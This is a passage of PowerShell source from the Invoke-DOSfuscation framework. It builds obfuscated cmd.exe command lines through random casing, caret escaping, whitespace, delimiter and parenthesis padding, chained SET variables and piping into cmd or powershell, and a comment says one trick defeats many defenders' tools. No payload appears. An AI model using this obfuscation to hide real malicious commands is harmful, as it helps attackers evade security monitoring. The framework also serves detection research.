        # Maintain history of previous variable name since they will be chained together in SET commands in this foreach loop.
        $prevSetVarName = $setVarName
    }

    # Set random whitespace values for the /V:ON flag if -RandomSpace switch is set.
    $randomSpaceA = ''
    if ($RandomSpace.IsPresent)
    {
        $RandomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Set necessary component values.
    $call   = 'call'
    $set    = 'set'
    $echo   = 'echo'
    $andAnd = '&&'
    $c1     = 'C'
    $c2     = 'C'
    $VFlag  = '/' + $VFlag.TrimStart('/') + $randomSpaceA

    # Set random flag values if -RandomFlag switch is set.
    if ($RandomFlag.IsPresent)
    {
        # Randomly choose between /C and /R flags since these flags are interchangeable for compatibility reasons (per "cmd.exe /?").
        $c1 = (Get-Random -InputObject @($c1,'R'))
        $c2 = (Get-Random -InputObject @($c2,'R'))
        
        # 1:4 decide if using environment variable syntax for first character of flag value.
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c1 = (Out-EnvVarEncodedCommand -StringToEncode $c1.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c1.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c2 = (Out-EnvVarEncodedCommand -StringToEncode $c2.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c2.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $VFlag = (Out-EnvVarEncodedCommand -StringToEncode $VFlag.Substring(0,1) -EnvVarPercent (Get-Random -InputObject @(50..100)) -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $VFlag.Substring(1)
        }
    }

    # Set random case values if -RandomCase switch is set.
    if ($RandomCase.IsPresent)
    {
        $call   = Out-RandomCase $call
        $set    = Out-RandomCase $set
        $echo   = Out-RandomCase $echo
        $c1     = Out-RandomCase (Get-Random -InputObject @($c1,'R'))
        $c2     = Out-RandomCase (Get-Random -InputObject @($c2,'R'))
        $VFlag  = Out-RandomCase $VFlag
        $andAnd = Get-Random -InputObject @('&','&&')

        # Only randomize the case of $CmdSyntax, $Cmd2Syntax and $PowerShellSyntax if they do not have escapable characters (as some of the more intricate syntaxes containing escapable characters are case-sensitive).
        if (-not $intricateCmdSyntax)
        {
            $CmdSyntax = Out-RandomCase $CmdSyntax
        }
        if (-not $intricateCmd2Syntax)
        {
            $Cmd2Syntax = Out-RandomCase $Cmd2Syntax
        }
        if (-not $intricatePowerShellSyntax)
        {
            $PowerShellSyntax = Out-RandomCase $PowerShellSyntax
        }
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $call  = Out-ObfuscatedCaret -StringToObfuscate $call  -RandomCaretPercent:$RandomCaretPercent
        $set   = Out-ObfuscatedCaret -StringToObfuscate $set   -RandomCaretPercent:$RandomCaretPercent
        $echo  = Out-ObfuscatedCaret -StringToObfuscate $echo  -RandomCaretPercent:$RandomCaretPercent
        if ($c1 -notmatch '\%.*\:.*\%')
        {
            $c1 = Out-ObfuscatedCaret -StringToObfuscate $c1 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($c2 -notmatch '\%.*\:.*\%')
        {
            $c2 = Out-ObfuscatedCaret -StringToObfuscate $c2 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($VFlag -notmatch '\%.*\:.*\%')
        {
            $VFlag = Out-ObfuscatedCaret -StringToObfuscate $VFlag -RandomCaretPercent:$RandomCaretPercent
        }
    }

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpace1 = ''
    $randomSpace2 = ''
    $randomSpace3 = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace3 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Get random commas and/or semicolons (and whitespace mixed in if -RandomSpace is also selected).'
    $randomChar1  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar2  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar3  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar4  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar5  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar6  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar7  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar8  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar9  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar10 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray

    # Concatenate all $setCommandArray variables for the final command.
    $allSetCommandArray = $setCommandArray + $setQuoteVariableSyntaxArray
    
    # Use Out-SetVarCommand to add random parentheses/commas/semicolons, but we need to strip off the random var SET syntax that Out-SetVarCommand adds by default for this use case.
    $joinedSetSyntax = Out-SetVarCommand -SubstringArray $allSetCommandArray -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray

    # Strip off random var SET syntax for this use case.
    $joinedSetSyntax = -join ($joinedSetSyntax[0] | foreach-object {
        if ($_ -match 's\^{0,1}e\^{0,1}t\^{0,1} [^=]*=[s^][se^][et^]')
        {
            $_.Replace($matches[0],$matches[0].Substring($matches[0].Length - 3)).TrimStart('^')
        }
        else
        {
            Write-Warning "Parsing error in above if/else blocks. Additional SET command syntax not properly stripped off of Out-SetVarCommand result."
            $_
        }
    })
    
    # Strip off trailing & or && for this use case.
    if ($joinedSetSyntax -match '[^^]\&{1,2}\s*$')
    {
        $joinedSetSyntax = $joinedSetSyntax.Substring(0,($joinedSetSyntax.Length - $matches[0].Length + 1))
    }

    # If -RandomChar argument is selected then add random parenthese layers where applicable based on $RandomCharRange.
    if ($RandomChar.IsPresent)
    {
        # Retrieve parenthesis counts from $randomCharRange so we get a balanced number of left and right parentheses from Get-RandomWhitespaceAndRandomChar.
        $parenCount1 = Get-Random -InputObject $randomCharRange -Count 1
        $parenCount2 = Get-Random -InputObject $randomCharRange -Count 1

        # Get random left and right parentheses with random whitespace if -RandomWhitespace argument is selected and with random commas and/or semicolons delimiters if -RandomChar argument is selected.
        $leftParen1  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen1 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $leftParen2  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen2 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
    
        # Trim leading delimiters and whitespace from parentheses since they will cause errors for variable SET commands inside FOR loops and PowerShell payloads.
        $leftParen1  = $leftParen1.Trim(' ,;')
        $rightParen1 = $rightParen1.Trim(' ,;')
        $leftParen2  = $leftParen2.Trim(' ,;')
        $rightParen2 = $rightParen2.Trim(' ,;')
    }
    else
    {
        $leftParen1  = ''
        $rightParen1 = ''
        $leftParen2  = ''
        $rightParen2 = ''
    }

    # If -RandomChar argument is selected then handle random commas/semicolons later in this function but ensure that the cmd.exe path ends with a comma/semicolon.
    # This is to highlight an obfuscation technique that many defenders' tools do not handle when attempting to look up a file, namely many assume the extension is ".exe," and fail to find the file on disk.
    if ($RandomChar.IsPresent)
    {
        $CmdSyntax  = $CmdSyntax.TrimEnd()  + (Get-Random -InputObject $RandomCharArray)
        $Cmd2Syntax = $Cmd2Syntax.TrimEnd() + (Get-Random -InputObject $RandomCharArray)
    }

    # If $CmdSyntax involves a path then whitespace is required after $CmdSyntax.
    if (($CmdSyntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $CmdSyntax.EndsWith(' '))
    {
        $CmdSyntax += ' '
    }

    # If $Cmd2Syntax involves a path then whitespace is required after $Cmd2Syntax.
    if (($Cmd2Syntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $Cmd2Syntax.EndsWith(' '))
    {
        $Cmd2Syntax += ' '
    }
    
    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmdSyntax)
    {
        # No additional escaping is needed for $CmdSyntax since it is the very beginning of the command. Later intricate syntaxes ($Cmd2Syntax and $PowerShellSyntax) will need additional escaping.
        
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        # Since this is the beginning of the whole command ensure that this single-alphanumeric variable is not accidentally present (particular NOT as a variable) in the remaining command.
        do
        {
            $cmdSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        }
        while ($joinedSetSyntax.ToLower().Contains("%$cmdSyntaxVarName".ToLower()))

        if ($RandomCaret.IsPresent)
        {
            $cmdSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmdSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($CmdSyntax -match $intricateForLoopRegex1)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmdSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($CmdSyntax -match $intricateForLoopRegex2)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmdSyntaxVarName)
        }
    }

    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmd2Syntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $cmd2SyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $cmd2SyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmd2SyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($Cmd2Syntax -match $intricateForLoopRegex1)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmd2SyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($Cmd2Syntax -match $intricateForLoopRegex2)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmd2SyntaxVarName)
        }
    
        # Create first and second halfs of commands for scenarios in final syntax below where ECHO statements need to be inserted into the intricate syntax.
        $cmd2SyntaxFirstHalf  = $Cmd2Syntax.Substring(0,$Cmd2Syntax.LastIndexOf("%$cmd2SyntaxVarName"))
        $cmd2SyntaxSecondHalf = $Cmd2Syntax.Substring($Cmd2Syntax.LastIndexOf("%$cmd2SyntaxVarName"))

        # Perform additional escaping for string tokens in the intricate syntax.
        $Cmd2SyntaxExtraCarets = $Cmd2Syntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($Cmd2Syntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $Cmd2SyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $Cmd2Syntax = $Cmd2Syntax.Replace($stringToEscape.Content,$escapedString)
                $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }

    # If using one of the more intricate PowerShell syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricatePowerShellSyntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $powershellSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $powershellSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $powershellSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($PowerShellSyntax -match $intricateForLoopRegex1)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $powershellSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($PowerShellSyntax -match $intricateForLoopRegex2)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $powershellSyntaxVarName)
        }
    
        # Create first and second halfs of commands for scenarios in final syntax below where ECHO statements need to be inserted into the intricate syntax.
        $powerShellSyntaxFirstHalf  = $PowerShellSyntax.Substring(0,$PowerShellSyntax.LastIndexOf("%$powershellSyntaxVarName"))
        $powerShellSyntaxSecondHalf = $PowerShellSyntax.Substring($PowerShellSyntax.LastIndexOf("%$powershellSyntaxVarName"))

        # Perform additional escaping for string tokens in the intricate syntax.
        $powerShellSyntaxExtraCarets = $PowerShellSyntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($PowerShellSyntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $powerShellSyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $PowerShellSyntax = $PowerShellSyntax.Replace($stringToEscape.Content,$escapedString)
                $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }
    
    # Ensure proper spacing after $CmdSyntax in $DecoyString1.
    if (-not ($randomChar1 -or $CmdSyntax.EndsWith(' ')) -and -not $DecoyString1.StartsWith(' '))
    {
        $DecoyString1 = ' ' + $DecoyString1
    }

    # Ensure specific $randomChar* variables are at least one whitespace if they are not defined.
    if (-not $randomChar5) { $randomChar5 = ' ' }
    if (-not $randomChar6) { $randomChar6 = ' ' }

    # Handle final syntax for -FinalBinary options of 'none' (default), 'powershell' and 'cmd' along with the optional -StdIn switch.
    if ($FinalBinary -eq 'none')
    {
        $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$randomChar4$leftParen1$call$randomChar5%$setVarName$commandVarNameGet%$rightParen1$randomSpace3`""
    }
    elseif ($FinalBinary -eq 'powershell')
    {
        # If the input PowerShell command contains a semicolon then if it is delimiting numerous commands we cannot encapsulate the PowerShell command with parentheses.
        if ($Command.Contains(';'))
        {
            $leftParen2  = ''
            $rightParen2 = ''
        }
        else
        {
            # If parentheses remain to encapsulate the input PowerShell command then we need to remove any obfuscation delimiters (, and/or ;) from the obfuscated parentheses.
            $leftParen2  = $leftParen2  -replace '[,;]',''
            $rightParen2 = $rightParen2 -replace '[,;]',''
        }

        if ($StdIn.IsPresent)
        {
            # Randomly decide to include "| powershell -" syntax inside the double quotes or outside.
            # The If block will be selected if multi-level escaping (i.e. '^^^') is used in the command.
            if ($joinedSetSyntax.Contains('^^^'))
            {
                if ($PowerShellSyntax -match '[^\^](\^{6})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^^^=','^^^^^^^=')
                }
                elseif ($PowerShellSyntax -match '[^\^](\^{2})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^=','^^^=')
                }
           
                # Handle output differently if unpaired double quotes need to be replaced and CALL is not used before the ECHO command. If $commandVarNameGet is not null then double quote substring substitution must occur.
                if ($commandVarNameGet)
                {
                    $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$randomChar4$call$randomChar5$echo$($randomChar6.Replace(',',';'))$leftParen2%$setVarName$commandVarNameGet%$rightParen2$($randomChar7.Replace(',',';'))`"$($randomChar8.Replace(',',';'))|$randomChar9$leftParen1$PowerShellSyntax $randomSpace2-$rightParen1$randomSpace3"
                }
                else
                {
                    # Use PowerShell syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
                    if ($intricatePowerShellSyntax)
                    {
                        $PowerShellSyntax = $powerShellSyntaxExtraCarets
                        
                        if ($PowerShellSyntax -match '[^\^](\^{6})=')
                        {
                            $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^^^=','^^^^^^^=')
                        }
                        elseif ($PowerShellSyntax -match '[^\^](\^{4})=')
                        {
                            $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^=','^^^^^^^=')
                        }
                        elseif ($PowerShellSyntax -match '[^\^](\^{2})=')
                        {
                            $PowerShellSyntax = $PowerShellSyntax.Replace('^^=','^^^=')
                        }
                    }

                    $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$randomChar4$echo$($randomChar5.Replace(',',';'))$leftParen2!$setVarName!$rightParen2$($randomChar7.Replace(',',';'))|$randomChar8$leftParen1$PowerShellSyntax $randomSpace2-$rightParen1$randomSpace3`""
                }
            }
            else
            {
                # Handle output differently if unpaired double quotes need to be replaced and CALL is not used before the ECHO command. If $commandVarNameGet is not null then double quote substring substitution must occur.
                if ($commandVarNameGet)
                {
                    $echoStatement = "$randomChar4$call$randomChar5$echo$($randomChar6.Replace(',',';'))$leftParen2%$setVarName$commandVarNameGet%$rightParen2$($randomChar7.Replace(',',';'))`"$($randomChar8.Replace(',',';'))|"

                    # Embed $echoStatement in $PowerShellSyntax if intricate syntax is used.
                    if ($intricatePowerShellSyntax)
                    {
                        # Ensure whitespace exists between DO and ECHO with the replacement logic performed in this block.
                        if (-not $randomChar4.Contains(' ')) { $randomChar4 = " $randomChar4" }

                        # Remove parenthesis variables, remove double quote and one set of $randomChar. Add double quote to $randomSpace3 so it will be added back at the end of $finalCommand.
                        $echoStatement = "$randomChar4$call$randomChar5$echo$($randomChar6.Replace(',',';'))%$setVarName$commandVarNameGet%$($randomChar7.Replace(',',';'))|"
                        $randomSpace3 += '"'

                        # Remove one layer of escaping (except for escaping of '=' character).
                        $powerShellSyntaxFirstHalf = $powerShellSyntaxFirstHalf.Replace('^^^','^').Replace('^^=','^^^=')
                        
                        if ($powerShellSyntaxFirstHalf -match '[^\^](\^{6})=')
                        {
                            $powerShellSyntaxFirstHalf = $powerShellSyntaxFirstHalf.Replace('^^^^^^=','^^^^^^^=')
                        }

                        # Reassemble $PowerShellSyntax with modified $echoStatement.
                        $PowerShellSyntax = $powerShellSyntaxFirstHalf + $echoStatement + $powerShellSyntaxSecondHalf

                        # Since echoStatement was inserted into $PowerShellSyntax above we do not need it in original placeholder position in below $finalCommand syntax.
                        $echoStatement = $null
                    }

                    $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$echoStatement$randomChar9$leftParen1$PowerShellSyntax $randomSpace2-$rightParen1$randomSpace3"
                }
                else
                {
                    $echoStatement = "$randomChar4$echo$($randomChar5.Replace(',',';'))$leftParen2!$setVarName!$rightParen2$($randomChar7.Replace(',',';'))`"$($randomChar8.Replace(',',';'))|"

                    # Embed $echoStatement in $PowerShellSyntax if intricate syntax is used.
                    if ($intricatePowerShellSyntax)
                    {
                        # Ensure whitespace exists between DO and ECHO with the replacement logic performed in this block.
                        if (-not $randomChar4.Contains(' ')) { $randomChar4 = " $randomChar4" }

                        # Remove parenthesis variables, remove double quote and one set of $randomChar. Add double quote to $randomSpace3 so it will be added back at the end of $finalCommand.
                        $echoStatement = "$randomChar4$echo$($randomChar5.Replace(',',';'))!$setVarName!$($randomChar7.Replace(',',';'))|"
                        $randomSpace3 += '"'

                        # Remove one layer of escaping (except for escaping of '=' character).
                        $powerShellSyntaxFirstHalf = $powerShellSyntaxFirstHalf.Replace('^^^','^').Replace('^^=','^^^=')
                        
                        if ($powerShellSyntaxFirstHalf -match '[^\^](\^{6})=')
                        {
                            $powerShellSyntaxFirstHalf = $powerShellSyntaxFirstHalf.Replace('^^^^^^=','^^^^^^^=')
                        }
    
                        # Reassemble $PowerShellSyntax with modified $echoStatement.
                        $PowerShellSyntax = $powerShellSyntaxFirstHalf + $echoStatement + $powerShellSyntaxSecondHalf

                        # Since echoStatement was inserted into $PowerShellSyntax above we do not need it in original placeholder position in below $finalCommand syntax.
                        $echoStatement = $null
                    }

                    $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$echoStatement$randomChar9$leftParen1$PowerShellSyntax $randomSpace2-$rightParen1$randomSpace3"
                }
            }
        }
        else
        {
            # Use PowerShell syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
            if ($intricatePowerShellSyntax)
            {
                $PowerShellSyntax = $powerShellSyntaxExtraCarets
            }

            # Randomly choose between /V+!var! and /V+CALL+%var% syntax giving preference to the latter.
            if (-not $commandVarNameGet -and (Get-Random -InputObject @(0..1)))
            {
                $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$randomChar4$leftParen1$PowerShellSyntax$($randomChar5.Replace(',',';'))`"$($randomChar7.Replace(',',';'))!$setVarName$commandVarNameGet!$($randomChar8.Replace(',',';'))`"$rightParen1$($randomChar9.Replace(',',';'))`"$($randomChar10.Replace(',',';'))"
            }
            else
            {
                # Embed $call in $PowerShellSyntax if intricate syntax is used.
                if ($intricatePowerShellSyntax)
                {
                    # Reassemble $PowerShellSyntax with $call inserted.
                    $PowerShellSyntax = $powerShellSyntaxFirstHalf + $randomChar5 + $call + $randomChar5 + $powerShellSyntaxSecondHalf.TrimStart()
    
                    # Set $call to $null so it is not duplicated in $finalCommand.
                    $call = $null   
                }

                $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$randomChar4$leftParen2$call$randomChar5$PowerShellSyntax$($randomChar6.Replace(',',';'))`"%$setVarName$commandVarNameGet%`"$rightParen2$($randomChar6.Replace(',',';'))`"$($randomChar8.Replace(',',';'))"
            }
        }
    }
    else
    {
        if ($StdIn.IsPresent)
        {
            # Use Cmd2 syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
            if ($intricateCmd2Syntax)
            {
                $Cmd2Syntax = $cmd2SyntaxExtraCarets
            }

            $echoStatement = "$randomChar4$leftParen1$echo$randomChar5%$setVarName$commandVarNameGet%$randomSpace2|"

            # Embed $echoStatement in $Cmd2Syntax if intricate syntax is used.
            if ($intricateCmd2Syntax)
            {
                # Ensure whitespace exists between DO and ECHO with the replacement logic performed in this block.
                if (-not $randomChar4.Contains(' ')) {$echoStatement = " $echoStatement"}

                # Remove one layer of escaping (except for escaping of '=' character).
                $cmd2SyntaxFirstHalf = $Cmd2SyntaxFirstHalf.Replace('^^^','^').Replace('^^=','^=')

                if ($Cmd2Syntax -match '[^\^](\^{2})=')
                {
                    $Cmd2Syntax = $Cmd2Syntax.Replace('^^=','^=')
                }
   
                # Reassemble $Cmd2Syntax with modified $echoStatement.
                $Cmd2Syntax = $cmd2SyntaxFirstHalf + $echoStatement + $cmd2SyntaxSecondHalf

                # Since echoStatement was inserted into $Cmd2Syntax above we do not need it in original placeholder position in below $finalCommand syntax.
                $echoStatement = $null
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$echoStatement$randomChar7$Cmd2Syntax$rightParen1$randomChar8`""
        }
        else
        {
            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$andAnd$randomChar4$Cmd2Syntax$randomChar5/$c2$randomChar6$leftParen2%$setVarName$commandVarNameGet%$rightParen2$randomSpace2`""
        }
    }

    # Throw warning if command size exceeds cmd.exe's 8,190 character limit.
    $cmdMaxLength = 8190
    if ($finalCommand.Length -gt $cmdMaxLength)
    {
        Write-Warning "This command exceeds the cmd.exe maximum allowed length of $cmdMaxLength characters! Its length is $($finalCommand.Length) characters."
        Start-Sleep -Seconds 1
    }

    # Return final command.
    return $finalCommand
}


function Out-RandomCase
{
<#
.SYNOPSIS

Out-RandomCase randomizes the case of input string.

Invoke-DOSfuscation Helper Function: Out-RandomCase
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-RandomCase randomizes the case of input string.

.PARAMETER StringToRandomizeCase

Specifies the string for which the case will be randomized.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $StringToRandomizeCase
    )

    return -join ( [System.Char[]] $StringToRandomizeCase | foreach-object {
        if (Get-Random -InputObject @(0..1))
        {
            $_.ToString().ToUpper()
        }
        else
        {
            $_.ToString().ToLower()
        }
    } )
}


function Get-RandomVarName
{
<#
.SYNOPSIS

Get-RandomVarName generates a random variable name string that is unique for every Invoke-Dos*Command function invocation in the Invoke-DOSfuscation framework to prevent variable name collisions.

Invoke-DOSfuscation Helper Function: Get-RandomVarName
Author: Daniel Bohannon (@danielhbohannon)
